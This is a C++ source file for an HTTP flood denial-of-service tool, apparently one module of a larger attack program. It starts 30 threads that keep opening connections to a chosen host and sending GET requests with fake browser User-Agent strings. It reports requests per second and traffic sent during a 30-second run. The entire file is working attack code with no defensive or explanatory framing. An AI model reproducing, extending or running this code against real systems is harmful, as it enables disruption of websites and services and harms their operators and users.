#include <iostream>
#include <string>
#include <cstring>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <vector>
#include <atomic>
#include <chrono>
#include <random>
#include <netinet/tcp.h>

static std::atomic<bool> attack_active{false};
static std::atomic<long long> total_reqs{0};
static std::atomic<long long> total_bytes_sent{0};
static std::string target_host;
static int target_port;
static struct in_addr target_ip;

std::string rand_str(int len) {
    const char c[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::string r;
    for (int i = 0; i < len; i++) r += c[rand() % (sizeof(c) - 1)];
    return r;
}

std::string rand_ua() {
    std::vector<std::string> ua = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
    };
    return ua[rand() % ua.size()];
}

void worker(int id) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(target_port);
    addr.sin_addr = target_ip;
    
    while (attack_active.load()) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        struct timeval tv;
        tv.tv_sec = 3;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(sock);
            continue;
        }
        
        std::string req = "GET / HTTP/1.1\r\n"
                         "Host: " + target_host + "\r\n"
                         "User-Agent: " + rand_ua() + "\r\n"
                         "Accept: */*\r\n"
                         "Connection: close\r\n\r\n";
        
        int sent = send(sock, req.c_str(), req.length(), 0);
        if (sent > 0) {
            total_reqs++;
            total_bytes_sent += sent;
        }
        
        close(sock);
        
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
    }
}

void httpflood(std::string target, int port) {
    if (attack_active.load()) {
        std::cout << "Attack already running" << std::endl;
        return;
    }
    
    target_host = target;
    target_port = port;
    
    if (target_host.find("https://") == 0) target_host = target_host.substr(8);
    if (target_host.find("http://") == 0) target_host = target_host.substr(7);
    
    struct hostent* he = gethostbyname(target_host.c_str());
    if (!he) {
        std::cout << "Cannot resolve: " << target_host << std::endl;
        return;
    }
    
    target_ip = *(struct in_addr*)he->h_addr;
    
    int threads = 30;
    
    std::cout << "\n[HTTP] " << target_host << ":" << target_port << std::endl;
    std::cout << "[IP] " << inet_ntoa(target_ip) << std::endl;
    std::cout << "[Threads] " << threads << std::endl;
    std::cout << "[Status] RUNNING" << std::endl;
    
    attack_active.store(true);
    total_reqs.store(0);
    total_bytes_sent.store(0);
    
    std::vector<std::thread> workers;
    for (int i = 0; i < threads; i++) {
        workers.emplace_back(worker, i);
    }
    
    auto start = std::chrono::steady_clock::now();
    long long last = 0;
    
    for (int i = 0; i < 30; i++) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        long long curr = total_reqs.load();
        long long rps = curr - last;
        std::cout << "[" << i+1 << "s] RPS: " << rps << " | Total: " << curr << std::endl;
        last = curr;
    }
    
    attack_active.store(false);
    
    for (auto& t : workers) {
        if (t.joinable()) t.join();
    }
    
    double elapsed = std::chrono::duration<double>(std::chrono::steady_clock::now() - start).count();
    double mb = total_bytes_sent.load() / (1024.0 * 1024.0);
    
    std::cout << "\n[DONE]" << std::endl;
    std::cout << "Duration: " << elapsed << "s" << std::endl;
    std::cout << "Requests: " << total_reqs.load() << std::endl;
    std::cout << "Avg RPS: " << (total_reqs.load() / elapsed) << std::endl;
    std::cout << "Traffic: " << mb << " MB" << std::endl;
}

void stop_http() {
    attack_active.store(false);
    std::cout << "[STOP] HTTP flood stopped" << std::endl;
}